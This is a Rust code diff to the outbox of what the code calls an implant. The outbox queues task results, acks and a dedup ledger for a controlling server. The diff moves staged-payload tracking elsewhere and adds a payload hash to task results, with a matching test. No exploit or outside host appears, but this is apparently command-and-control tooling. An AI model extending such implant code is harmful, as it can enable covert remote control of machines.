@@ -3,7 +3,7 @@ use std::collections::{HashMap, VecDeque};
 use prost::Message;
 
 use crate::handlers::Outcome;
-use crate::wire::{Frame, FrameKind, StagedPull, TaskAck, TaskRequest, TaskResult};
+use crate::wire::{Frame, FrameKind, TaskAck, TaskResult};
 
 /// The upstream batch and the task ledger: one owner for everything the
 /// implant owes the server, so a carriage's failure semantics are a method
@@ -14,18 +14,14 @@ use crate::wire::{Frame, FrameKind, StagedPull, TaskAck, TaskRequest, TaskResult
 /// contact re-sends the batch verbatim; the server records results
 /// first-wins, so re-sending is safe. The ledger is the dedup half of the
 /// dispatch strand: a redelivered task is answered from the cache and never
-/// re-executed.
+/// re-executed. Staged transfers live on the session (their held bytes
+/// outlive any one carriage), not here -- only their results ride the batch.
 #[derive(Default)]
 pub struct Outbox {
     queue: VecDeque<Frame>,
     /// Completed tasks by id: (wire outcome, output). A held entry answers
     /// any redelivery from the cache.
     ledger: HashMap<String, (Outcome, String)>,
-    /// Staged tasks awaiting their payload, keyed by id: the original
-    /// request is kept whole (verb and arguments ride the staged grammar),
-    /// and the demand order is the map's insertion order via `demands`.
-    staged: HashMap<String, TaskRequest>,
-    demands: Vec<String>,
 }
 
 impl Outbox {
@@ -37,18 +33,49 @@ impl Outbox {
     /// numeric outcome codes live behind this boundary -- the rest of the
     /// implant speaks `Outcome`.
     pub fn result(&mut self, task_id: &str, outcome: Outcome, output: &str) {
-        self.ledger
-            .insert(task_id.to_string(), (outcome, output.to_string()));
         let wire = if outcome == Outcome::Succeeded {
             crate::wire::rod::TaskOutcome::Succeeded as i32
         } else {
             crate::wire::rod::TaskOutcome::Failed as i32
         };
+        self.push_result(task_id, outcome, output, wire, None);
+    }
+
+    /// A staged task's result carries the payload hash the implant computed
+    /// over what it reassembled (ADR-010's both-side arm): the server
+    /// compares it against the artifact it served, so Succeeded means both
+    /// sides held the same bytes.
+    pub fn result_with_payload_sha(
+        &mut self,
+        task_id: &str,
+        outcome: Outcome,
+        output: &str,
+        payload_sha256: &str,
+    ) {
+        let wire = if outcome == Outcome::Succeeded {
+            crate::wire::rod::TaskOutcome::Succeeded as i32
+        } else {
+            crate::wire::rod::TaskOutcome::Failed as i32
+        };
+        self.push_result(task_id, outcome, output, wire, Some(payload_sha256));
+    }
+
+    fn push_result(
+        &mut self,
+        task_id: &str,
+        outcome: Outcome,
+        output: &str,
+        wire: i32,
+        payload_sha256: Option<&str>,
+    ) {
+        self.ledger
+            .insert(task_id.to_string(), (outcome, output.to_string()));
         self.queue.push_back(Frame {
             payload: TaskResult {
                 task_id: task_id.to_string(),
                 outcome: wire,
                 output: output.to_string(),
+                payload_sha256: payload_sha256.map(str::to_string),
             }
             .encode_to_vec(),
             kind: FrameKind::TaskResult as i32,
@@ -85,30 +112,6 @@ impl Outbox {
             .encode_to_vec(),
             kind: FrameKind::TaskAck as i32,
         });
-    }
-
-    /// Queues the demand for a staged task's payload, keeping the original
-    /// request for the dispatch that follows the chunk run.
-    pub fn demand_staged(&mut self, task: TaskRequest) {
-        self.demands.push(task.task_id.clone());
-        let id = task.task_id.clone();
-        self.queue.push_back(Frame {
-            payload: StagedPull {
-                task_id: id.clone(),
-            }
-            .encode_to_vec(),
-            kind: FrameKind::StagedPull as i32,
-        });
-        self.staged.insert(id, task);
-    }
-
-    /// Takes this cycle's demands in order, removing them from the pending
-    /// set (the response's chunk runs answer them below).
-    pub fn take_demands(&mut self) -> Vec<TaskRequest> {
-        std::mem::take(&mut self.demands)
-            .into_iter()
-            .filter_map(|id| self.staged.remove(&id))
-            .collect()
     }
 }
 
@@ -161,27 +164,20 @@ mod tests {
     }
 
     #[test]
-    fn staged_demands_keep_their_arrival_order() {
+    fn staged_results_carry_the_payload_hash() {
         let mut outbox = Outbox::default();
-        for id in ["a", "b"] {
-            let task = TaskRequest {
-                task_id: id.into(),
-                verb: "file.push".into(),
-                staged_bytes: Some(2048),
-                ..Default::default()
-            };
-            outbox.demand_staged(task);
-        }
-        let demands = outbox.take_demands();
-        let ids: Vec<&str> = demands.iter().map(|task| task.task_id.as_str()).collect();
-        assert_eq!(ids, vec!["a", "b"]);
-        // Taken demands are spent.
-        assert!(outbox.take_demands().is_empty());
-        // Each demand queued its pull frame.
+        outbox.result_with_payload_sha(
+            "t-1",
+            Outcome::Succeeded,
+            "/tmp/x: 4 bytes written",
+            &"ab".repeat(32),
+        );
         let batch = outbox.batch();
-        assert_eq!(batch.len(), 2);
-        assert!(batch
-            .iter()
-            .all(|frame| frame.kind() == FrameKind::StagedPull));
+        let result = TaskResult::decode(batch[0].payload.as_ref()).expect("the result decodes");
+        assert_eq!(result.payload_sha256.as_deref(), Some(&"ab".repeat(32)[..]));
+        // The ordinary result stays the plain shape: no field on the wire.
+        outbox.result("t-2", Outcome::Succeeded, "ok");
+        let plain = TaskResult::decode(outbox.batch()[1].payload.as_ref()).expect("decodes");
+        assert_eq!(plain.payload_sha256, None);
     }
 }
